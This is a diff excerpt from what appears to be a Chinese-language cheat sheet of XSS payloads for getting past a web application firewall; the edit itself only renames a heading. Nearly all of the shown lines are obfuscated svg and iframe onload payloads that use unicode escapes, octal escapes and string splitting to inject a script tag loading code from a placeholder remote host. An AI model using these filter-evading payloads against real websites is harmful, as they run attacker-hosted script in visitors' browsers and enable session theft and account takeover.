@@ -167,8 +167,8 @@ waf拦截
 <svg/onload=\u0073etInterval(appendChild(createElement('sc\162ipt')).src='http://xx.xx/eeW')>
 <svg/onload=\u0073etInterval(appendChild(createElement('scr'%2b'ipt')).src='http://xx.xx/eeW')>
 <svg/onload=\u0073etInterval(\u0061ppendChild(\u0063reateElement('scr'%2b'ipt')).src='http://xx.xx/eeW')>
-函数结合
-
+ 
+结合函数：
 <iframe onload=s=createElement('script');body.appendChild(s);s.src=['http','://','xx.xx','/eeW'].join('') >
 <svg/onload=s=createElement('script');body.appendChild(s);s.src=['http']%2B['://']%2B['xx.xx']%2B['/eeW'].join('') >
 <svg/onload=s=\u0063reateElement('scr'%2b'ipt');\u0062ody.\u0061ppendChild(s);s.src='http://x'.concat('x.xx/','eeW'); >
